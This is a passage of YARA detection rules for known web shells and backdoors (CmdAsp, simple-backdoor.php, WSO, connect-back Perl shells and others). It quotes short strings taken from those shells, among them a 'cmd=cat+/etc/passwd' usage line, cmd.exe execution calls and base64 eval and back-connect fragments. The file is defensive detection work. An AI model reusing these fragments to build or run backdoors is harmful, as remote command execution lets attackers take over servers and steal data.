		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L4147-L4160"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "64f24f09ec6efaa904e2492dffc518b9"
		logic_hash = "95dc25ecd47b43edbd7e7e36966377aa09da769aff2bc1c33a7df87989611bfa"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "CmdAsp.asp"
		$s1 = "Set oFileSys = Server.CreateObject(\"Scripting.FileSystemObject\")" fullword
		$s2 = "-- Use a poor man's pipe ... a temp file --"
		$s3 = "maceo @ dogmile.com"

	condition:
		2 of them
}

rule SIGNATURE_BASE_Simple_Backdoor_Php
{
	meta:
		description = "Semi-Auto-generated  - file simple-backdoor.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "5607f501-a750-59be-9595-5ac71ea6f74b"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L4161-L4173"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "f091d1b9274c881f8e41b2f96e6b9936"
		logic_hash = "e2e98580b59727313de298fab0009704f621b1b6556220d5065118d960f7a068"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "$cmd = ($_REQUEST['cmd']);" fullword
		$s1 = "<!-- Simple PHP backdoor by DK (http://michaeldaw.org) -->"
		$s2 = "Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd" fullword

	condition:
		2 of them
}

rule SIGNATURE_BASE_Mysql_Shell_Php
{
	meta:
		description = "Semi-Auto-generated  - file mysql_shell.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "e517984b-575c-5ead-a438-9767d2c74099"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L4174-L4186"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "d42aec2891214cace99b3eb9f3e21a63"
		logic_hash = "dbd825e1056c41efaf80c0495ba7b6cf1c88403b997ea7ac1378512a19f7ed8a"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "SooMin Kim"
		$s1 = "smkim@popeye.snu.ac.kr"
		$s2 = "echo \"<td><a href='$PHP_SELF?action=deleteData&dbname=$dbname&tablename=$tablen"

	condition:
		1 of them
}

rule SIGNATURE_BASE_Dive_Shell_1_0___Emperor_Hacking_Team_Php
{
	meta:
		description = "Semi-Auto-generated  - file Dive Shell 1.0 - Emperor Hacking Team.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "d75294a4-a0a7-5c74-bb7a-766db477633c"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L4187-L4200"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "1b5102bdc41a7bc439eea8f0010310a5"
		logic_hash = "bd51b625359799178ad3c8e02ba5bb5fca89e6e14769b86dd35c2b8a1049599f"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "Emperor Hacking TEAM"
		$s1 = "Simshell" fullword
		$s2 = "ereg('^[[:blank:]]*cd[[:blank:]]"
		$s3 = "<form name=\"shell\" action=\"<?php echo $_SERVER['PHP_SELF'] ?>\" method=\"POST"

	condition:
		2 of them
}

rule SIGNATURE_BASE_Asmodeus_V0_1_Pl
{
	meta:
		description = "Semi-Auto-generated  - file Asmodeus v0.1.pl.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "cfd082a8-56fa-54bc-a683-c0052f78e12e"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L4201-L4214"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "0978b672db0657103c79505df69cb4bb"
		logic_hash = "be0130c9d2a5d29e6ef8749b0058c96c2ca1ecb9823fd14a8a2c82978cf3d104"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "[url=http://www.governmentsecurity.org"
		$s1 = "perl asmodeus.pl client 6666 127.0.0.1"
		$s2 = "print \"Asmodeus Perl Remote Shell"
		$s4 = "$internet_addr = inet_aton(\"$host\") or die \"ALOA:$!\\n\";" fullword

	condition:
		2 of them
}

rule SIGNATURE_BASE_Backup_Php_Often_With_C99Shell
{
	meta:
		description = "Semi-Auto-generated  - file backup.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "ce88027c-ae08-59f3-948d-6f3d58515468"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L4215-L4227"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "aeee3bae226ad57baf4be8745c3f6094"
		logic_hash = "e27d00ebfbac2565568b9a97552a331db91b4e9aa318febb048937f5c3a1a1ba"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "#phpMyAdmin MySQL-Dump" fullword
		$s2 = ";db_connect();header('Content-Type: application/octetstr"
		$s4 = "$data .= \"#Database: $database" fullword

	condition:
		all of them
}

rule SIGNATURE_BASE_Reader_Asp
{
	meta:
		description = "Semi-Auto-generated  - file Reader.asp.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "70094d24-fa3a-503c-b9b6-294a883fc52c"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L4228-L4240"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "ad1a362e0a24c4475335e3e891a01731"
		logic_hash = "ec0dc3b050d84e852e0c18bd00961f109d3506fa7f2e8656448bd5edd28d9305"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s1 = "Mehdi & HolyDemon"
		$s2 = "www.infilak."
		$s3 = "'*T@*r@#@&mms^PdbYbVuBcAAA==^#~@%><form method=post name=inf><table width=\"75%"

	condition:
		2 of them
}

rule SIGNATURE_BASE_Phpshell17_Php
{
	meta:
		description = "Semi-Auto-generated  - file phpshell17.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "ea1f657c-2023-50bb-a2ee-33c53ee8fb5e"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L4241-L4253"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "9a928d741d12ea08a624ee9ed5a8c39d"
		logic_hash = "a9306747a5c9756f393c61562ed4a601c75c3a9491ad19a7b7dbae1fbd505e9a"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "<input name=\"submit_btn\" type=\"submit\" value=\"Execute Command\"></p>" fullword
		$s1 = "<title>[ADDITINAL TITTLE]-phpShell by:[YOURNAME]<?php echo PHPSHELL_VERSION ?></"
		$s2 = "href=\"mailto: [YOU CAN ENTER YOUR MAIL HERE]- [ADDITIONAL TEXT]</a></i>" fullword

	condition:
		1 of them
}

rule SIGNATURE_BASE_Myshell_Php_Php
{
	meta:
		description = "Semi-Auto-generated  - file myshell.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "eaf243cb-fa26-5f34-a724-60a08acff636"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L4254-L4266"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "62783d1db52d05b1b6ae2403a7044490"
		logic_hash = "dd7b0fa637a8317986de0c2312b4b552f1110fb5a64590a9a21c854e5985fbb6"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "@chdir($work_dir) or ($shellOutput = \"MyShell: can't change directory."
		$s1 = "echo \"<font color=$linkColor><b>MyShell file editor</font> File:<font color"
		$s2 = " $fileEditInfo = \"&nbsp;&nbsp;:::::::&nbsp;&nbsp;Owner: <font color=$"

	condition:
		2 of them
}

rule SIGNATURE_BASE_Simshell_1_0___Simorgh_Security_MGZ_Php
{
	meta:
		description = "Semi-Auto-generated  - file SimShell 1.0 - Simorgh Security MGZ.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "51565555-a17b-59c7-b433-c3166fe0d7f0"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L4267-L4280"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "37cb1db26b1b0161a4bf678a6b4565bd"
		logic_hash = "590a1572877fafcd4425a04c12cd56194f03a63b7acad93c39d4b16dc5a1902d"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "Simorgh Security Magazine "
		$s1 = "Simshell.css"
		$s2 = "} elseif (ereg('^[[:blank:]]*cd[[:blank:]]+([^;]+)$', $_REQUEST['command'], "

rule SIGNATURE_BASE_Jspshall_Jsp
{
	meta:
		description = "Semi-Auto-generated  - file jspshall.jsp.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "4bccad33-d26e-52c2-b7f8-802f2c8f3889"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L4281-L4293"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "efe0f6edaa512c4e1fdca4eeda77b7ee"
		logic_hash = "94c458d3f38ba21348b0202e2b81bbbc3859e97d64f101a9ea7ec6f036e38bc5"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "kj021320"
		$s1 = "case 'T':systemTools(out);break;"
		$s2 = "out.println(\"<tr><td>\"+ico(50)+f[i].getName()+\"</td><td> file"

	condition:
		2 of them
}

rule SIGNATURE_BASE_Webshell_Php
{
	meta:
		description = "Semi-Auto-generated  - file webshell.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L4294-L4305"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "e425241b928e992bde43dd65180a4894"
		logic_hash = "7b0f4f4afde7dcb44c9d877a72c961f3666278ce28a24ae8068cfbc32639e307"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s2 = "<die(\"Couldn't Read directory, Blocked!!!\");"
		$s3 = "PHP Web Shell"

	condition:
		all of them
}

rule SIGNATURE_BASE_Rootshell_Php
{
	meta:
		description = "Semi-Auto-generated  - file rootshell.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "aec6621e-f23a-5f9f-91f1-d2f1b1ab58d0"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L4306-L4319"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "265f3319075536030e59ba2f9ef3eac6"
		logic_hash = "f836dd1825dc84212d32a034c0dde45d60ccd1eb667018abb60d671b61192666"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "shells.dl.am"
		$s1 = "This server has been infected by $owner"
		$s2 = "<input type=\"submit\" value=\"Include!\" name=\"inc\"></p>"
		$s4 = "Could not write to file! (Maybe you didn't enter any text?)"

	condition:
		2 of them
}

rule SIGNATURE_BASE_Connectback2_Pl
{
	meta:
		description = "Semi-Auto-generated  - file connectback2.pl.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "4ddebc62-17d2-577e-84bd-207367078327"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L4320-L4332"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "473b7d226ea6ebaacc24504bd740822e"
		logic_hash = "7316c93f12dbbf6d0235601d8be88c199e37955507925222d00041d0ceaf01c7"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "#We Are: MasterKid, AleXutz, FatMan & MiKuTuL                                   "
		$s1 = "echo --==Userinfo==-- ; id;echo;echo --==Directory==-- ; pwd;echo; echo --==Shel"
		$s2 = "ConnectBack Backdoor"

	condition:
		1 of them
}

rule SIGNATURE_BASE_Defacekeeper_0_2_Php
{
	meta:
		description = "Semi-Auto-generated  - file DefaceKeeper_0.2.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "671323e2-42cb-5ce0-9839-5d01c446471c"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L4333-L4345"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "713c54c3da3031bc614a8a55dccd7e7f"
		logic_hash = "0ee3fed3441e9561867508e324d7a6b1808a8923513bf1c9b82f8238224c994c"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "target fi1e:<br><input type=\"text\" name=\"target\" value=\"index.php\"></br>" fullword
		$s1 = "eval(base64_decode(\"ZXZhbChiYXNlNjRfZGVjb2RlKCJhV2R1YjNKbFgzVnpaWEpmWVdKdmNuUW9"
		$s2 = "<img src=\"http://s43.radikal.ru/i101/1004/d8/ced1f6b2f5a9.png\" align=\"center"

	condition:
		1 of them
}

rule SIGNATURE_BASE_Shells_PHP_Wso
{
	meta:
		description = "Semi-Auto-generated  - file wso.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "fdce6094-a88e-5da6-aeb0-bc97b15bf397"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L4346-L4357"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "33e2891c13b78328da9062fbfcf898b6"
		logic_hash = "31ef69228b66b30300006f63b1e4d6e92c2512caca4bd915d418b48564b39c47"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "$back_connect_p=\"IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGlhZGRyPWluZXRfYXRvbi"
		$s3 = "echo '<h1>Execution PHP-code</h1><div class=content><form name=pf method=pos"

	condition:
		1 of them
}

rule SIGNATURE_BASE_Elmaliseker_Asp
{
	meta:
		description = "Semi-Auto-generated  - file elmaliseker.asp.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "7ecf3d5c-be91-579e-905b-5f2ad03a0e42"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L4371-L4384"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "b32d1730d23a660fd6aa8e60c3dc549f"
		logic_hash = "969f0f12449375a9ebbb8a68fd4b3db395927416d5cceccdb7f2c64310430880"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "if Int((1-0+1)*Rnd+0)=0 then makeEmail=makeText(8) & \"@\" & makeText(8) & \".\""
		$s1 = "<form name=frmCMD method=post action=\"<%=gURL%>\">"
		$s2 = "dim zombie_array,special_array"
		$s3 = "http://vnhacker.org"

	condition:
		1 of them
}

rule SIGNATURE_BASE_Dxshell_Php_Php
{
	meta:
		description = "Semi-Auto-generated  - file DxShell.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "b89930b7-acf3-5078-8429-d59e27e4b00c"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L4397-L4408"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "33a2b31810178f4c2e71fbdeb4899244"
		logic_hash = "821f9295eba6119ad08349e769d1909cd7836b4e35795915e94095cf715dc6e5"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "print \"\\n\".'Tip: to view the file \"as is\" - open the page in <a href=\"'.Dx"
		$s2 = "print \"\\n\".'<tr><td width=100pt class=linelisting><nobr>POST (php eval)</td><"

	condition:
		1 of them
}

rule SIGNATURE_BASE_S72_Shell_V1_1_Coding_Html
{
	meta:
		description = "Semi-Auto-generated  - file s72 Shell v1.1 Coding.html.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "dfd3b80e-6245-5f74-9d6a-6006218891ac"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L4409-L4421"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "c2e8346a5515c81797af36e7e4a3828e"
		logic_hash = "aef8840b72e5c435c11150007d6b3af2943126fefdc6df343d0f73755340e260"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "Dizin</font></b></font><font face=\"Verdana\" style=\"font-size: 8pt\"><"
		$s1 = "s72 Shell v1.0 Codinf by Cr@zy_King"
		$s3 = "echo \"<p align=center>Dosya Zaten Bulunuyor</p>\""

	condition:
		1 of them
}

rule SIGNATURE_BASE_Kacak_Asp
{
	meta:
		description = "Semi-Auto-generated  - file kacak.asp.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "1ae15174-b84a-5826-b768-7afed65196db"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L4422-L4435"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "907d95d46785db21331a0324972dda8c"
		logic_hash = "8542a3985dff2d1eb42f4d2c9f30405a4817a8e30075225c518ec52381f1f7df"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "Kacak FSO 1.0"
		$s1 = "if request.querystring(\"TGH\") = \"1\" then"
		$s3 = "<font color=\"#858585\">BuqX</font></a></font><font face=\"Verdana\" style="
		$s4 = "mailto:BuqX@hotmail.com"

	condition:
		1 of them
}

rule SIGNATURE_BASE_PHP_Backdoor_Connect_Pl_Php
{
	meta:
		description = "Semi-Auto-generated  - file PHP Backdoor Connect.pl.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "96c9258e-3894-5ee9-b52c-eb7ba7454416"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L4436-L4448"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "57fcd9560dac244aeaf95fd606621900"
		logic_hash = "b141546f45767884f9c8b1cc4c09ea25f90c0f3a3633bfeecad78b60e7f20306"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "LorD of IRAN HACKERS SABOTAGE"
		$s1 = "LorD-C0d3r-NT"
		$s2 = "echo --==Userinfo==-- ;"

	condition:
		1 of them
}

rule SIGNATURE_BASE_Antichat_Socks5_Server_Php_Php
{
	meta:
		description = "Semi-Auto-generated  - file Antichat Socks5 Server.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "35d0930c-ef07-5fd4-9d7a-c0d685f92339"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L4449-L4461"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "cbe9eafbc4d86842a61a54d98e5b61f1"
		logic_hash = "d6b203561f95f431b3d2c241011ae08c05619d45c5900a28137481c029e8297e"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "$port = base_convert(bin2hex(substr($reqmessage[$id], 3+$reqlen+1, 2)), 16, 10);" fullword
		$s3 = "#   [+] Domain name address type"
		$s4 = "www.antichat.ru"

	condition:
		1 of them
}

rule SIGNATURE_BASE_Antichat_Shell_V1_3_Php
{
	meta:
		description = "Semi-Auto-generated  - file Antichat Shell v1.3.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "856cf977-24da-58e0-b6d2-820c92075ecc"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L4462-L4474"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "40d0abceba125868be7f3f990f031521"
		logic_hash = "566c324f3bf44ce9f32ddad82a8d3daa87a8a75b5ca0c8286bc912a8ae4ac8e9"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "Antichat"
		$s1 = "Can't open file, permission denide"
		$s2 = "$ra44"

	condition:
		2 of them
}

rule SIGNATURE_BASE_Safe_Mode_Bypass_PHP_4_4_2_And_PHP_5_1_2_Php
{
	meta:
		description = "Semi-Auto-generated  - file Safe_Mode Bypass PHP 4.4.2 and PHP 5.1.2.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "3e81f628-31b4-5c22-943e-62c8cb4c0c4d"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L4475-L4487"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "49ad9117c96419c35987aaa7e2230f63"
		logic_hash = "d6d2a3999f2e8ceb70f57697c0a845edbbcfce0aba151ec6a0ac23f55265cd47"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "Welcome.. By This script you can jump in the (Safe Mode=ON) .. Enjoy"
		$s1 = "Mode Shell v1.0</font></span>"
		$s2 = "has been already loaded. PHP Emperor <xb5@hotmail."

	condition:
		1 of them
}

rule SIGNATURE_BASE_Worse_Linux_Shell_Php
{
	meta:
		description = "Semi-Auto-generated  - file Worse Linux Shell.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "e223e2a9-7c7a-597a-8b90-a63ee11805ea"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L4501-L4512"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "8338c8d9eab10bd38a7116eb534b5fa2"
		logic_hash = "47801296b700e85f9e08857eb06f845ef8ed3f88b7d0de34d4b7c47cef6cc7fb"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s1 = "print \"<tr><td><b>Server is:</b></td><td>\".$_SERVER['SERVER_SIGNATURE'].\"</td"
		$s2 = "print \"<tr><td><b>Execute command:</b></td><td><input size=100 name=\\\"_cmd"

	condition:
		1 of them
}

rule SIGNATURE_BASE_Cyberlords_Sql_Php_Php
{
	meta:
		description = "Semi-Auto-generated  - file cyberlords_sql.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "41730336-0dce-5ed9-95b0-c911a4e3cb48"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L4513-L4526"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "03b06b4183cb9947ccda2c3d636406d4"
		logic_hash = "b3286f9fd86c90c5afc79801b6d65c9ae52ee1c37da93ff15461d84f37ef8019"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "Coded by n0 [nZer0]"
		$s1 = " www.cyberlords.net"
		$s2 = "U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAAMUExURf///wAAAJmZzAAAACJoURkAAAAE"
		$s3 = "return \"<BR>Dump error! Can't write to \".htmlspecialchars($file);"

	condition:
		1 of them
}

rule SIGNATURE_BASE_Cmd_Asp_5_1_Asp
{
	meta:
		description = "Semi-Auto-generated  - file cmd-asp-5.1.asp.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "fc204ab8-892d-5435-a737-a185ca32e938"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L4527-L4538"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "8baa99666bf3734cbdfdd10088e0cd9f"
		logic_hash = "a41c83da1a65e67b6f4ac6ad7cc8702486957ab0c7dda658d071e603338c324b"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "Call oS.Run(\"win.com cmd.exe /c del \"& szTF,0,True)" fullword
		$s3 = "Call oS.Run(\"win.com cmd.exe /c \"\"\" & szCMD & \" > \" & szTF &" fullword

	condition:
		1 of them
}

rule SIGNATURE_BASE_Pws_Php_Php
{
	meta:
		description = "Semi-Auto-generated  - file pws.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "1ec47c33-dbec-50bd-b4b0-8f00b704a816"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L4539-L4551"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "ecdc6c20f62f99fa265ec9257b7bf2ce"
